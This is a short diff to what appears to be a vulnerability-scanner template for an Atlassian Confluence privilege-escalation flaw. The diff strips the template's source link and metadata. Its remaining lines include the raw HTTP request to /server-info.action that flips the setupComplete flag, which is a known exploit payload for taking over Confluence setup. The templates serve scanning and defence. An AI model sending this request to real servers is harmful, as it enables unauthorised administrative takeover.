@@ -3,12 +3,8 @@ info:
   name: Atlassian Confluence 权限提升漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dsl0p2slrismvffp'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dsl0p2slrismvffp
-    fofa: 暂无
 http:
 - raw:
   - 'GET /server-info.action?BootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1
